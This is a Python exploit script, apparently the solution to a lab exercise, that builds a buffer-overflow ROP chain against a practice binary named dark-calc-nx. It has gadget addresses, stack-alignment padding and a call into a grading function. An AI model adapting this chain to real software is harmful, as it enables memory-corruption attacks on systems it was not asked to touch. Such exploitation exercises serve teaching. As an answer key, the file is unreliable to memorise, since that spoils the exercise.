#!/usr/bin/env python3
"""Task 3: ROP on dark-calc-nx (NX + stack ASLR, non-PIE .text).

Gadgets, all inside __libc_csu_init / its epilogue (0x4019d0..0x401a34):

    0x401a33  5f c3        pop rdi ; ret        (second byte pair of `pop r15`)
    0x401a34  c3           ret
    0x401978               grade_eval
    0x4016e0               exit@plt

Why the extra `ret` before grade_eval: `ret` from input() lands us on a
16-byte-aligned rsp, and every `ret` flips the alignment by 8.  Entering
grade_eval() with rsp%16 == 8 is what a real `call` would do; without the
padding ret, printf() inside grade_eval() hits a movaps on a misaligned
address and the exploit dies before printing anything.
"""
import sys
from struct import pack

POP_RDI    = 0x401A33
RET        = 0x401A34
GRADE_EVAL = 0x401978
EXIT_PLT   = 0x4016E0

payload  = b"A" * 0x18                        # buffer + saved rbp
payload += pack("<Q", POP_RDI)
payload += pack("<Q", 4)                      # edi = 4  -> prints "A"
payload += pack("<Q", RET)                    # alignment fix
payload += pack("<Q", GRADE_EVAL)
payload += pack("<Q", RET)                    # alignment fix for exit()
payload += pack("<Q", EXIT_PLT)

sys.stdout.buffer.write(payload + b"\n")
